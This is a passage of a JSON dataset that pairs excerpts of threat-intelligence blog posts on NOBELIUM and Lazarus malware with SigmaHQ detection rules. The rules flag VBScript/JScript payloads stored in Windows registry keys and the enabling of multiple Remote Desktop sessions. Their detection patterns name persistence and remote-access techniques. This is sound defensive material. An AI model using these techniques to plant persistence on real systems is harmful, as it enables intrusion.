    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_turn_on_dev_features.yml"
  },
  "1028": {
    "url": "https://www.microsoft.com/en-us/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/",
    "markdown": "# GoldMax, GoldFinder, and Sibot: Analyzing NOBELIUM’s layered persistence **March 4, 2021** --- ### April 2023 update **Microsoft Threat Intelligence** has shifted to a new threat actor naming taxonomy aligned around the theme of weather. NOBELIUM is now tracked as **Midnight Blizzard**. ### April 15, 2021 update We updated this blog with new indicators of compromise, including files, domains, and C2 decoy traffic, released by Cybersecurity & Infrastructure Security Agency (CISA) in Malware Analysis Report MAR-10327841-1.v1 – SUNSHUTTLE. --- Microsoft continues to work with partners and customers to expand our knowledge of the threat actor behind the nation-state cyberattacks that",
    "sigma_rule": {
      "title": "VBScript Payload Stored in Registry",
      "id": "46490193-1b22-4c29-bdd6-5bf63907216f",
      "status": "test",
      "description": "Detects VBScript content stored into registry keys as seen being used by UNC2452 group",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2021-03-05",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.t1547.001"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains": "Software\\Microsoft\\Windows\\CurrentVersion",
          "Details|contains": [
            "vbscript:",
            "jscript:",
            "mshtml,",
            "RunHTMLApplication",
            "Execute(",
            "CreateObject",
            "window.close"
          ]
        },
        "filter": {
          "TargetObject|contains": "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        },
        "filter_dotnet": {
          "Image|endswith": "\\msiexec.exe",
          "TargetObject|contains": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\UserData\\",
          "Details|contains": [
            "\\Microsoft.NET\\Primary Interop Assemblies\\Microsoft.mshtml.dll",
            "<\\Microsoft.mshtml,fileVersion=",
            "_mshtml_dll_",
            "<\\Microsoft.mshtml,culture="
          ]
        },
        "condition": "selection and not 1 of filter*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_vbs_payload_stored.yml"
  },
  "1029": {
    "url": "https://blog.talosintelligence.com/lazarus-three-rats/",
    "markdown": "# Lazarus and the tale of three RATs **Thursday, September 8, 2022 08:01** Threat Spotlight - Cisco Talos has been tracking a new campaign operated by the Lazarus APT group, attributed to North Korea by the United States government. - This campaign involved the exploitation of vulnerabilities in VMWare Horizon to gain an initial foothold into targeted organizations. - Targeted organizations include energy providers from around the world, including those headquartered in the United States, Canada, and Japan. - The campaign is meant to infiltrate organizations around the world for establishing long-term access and subsequently exfiltrating data of interest to",
    "sigma_rule": {
      "title": "Winlogon AllowMultipleTSSessions Enable",
      "id": "f7997770-92c3-4ec9-b112-774c4ef96f96",
      "status": "test",
      "description": "Detects when the 'AllowMultipleTSSessions' value is enabled.\nWhich allows for multiple Remote Desktop connection sessions to be opened at once.\nThis is often used by attacker as a way to connect to an RDP session without disconnecting the other users\n",
      "references": [
        "https://blog.talosintelligence.com/lazarus-three-rats/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-09",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence",
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AllowMultipleTSSessions",
          "Details|endswith": "DWORD (0x00000001)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate use of the multi session functionality"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_winlogon_allow_multiple_tssessions.yml"
  }
}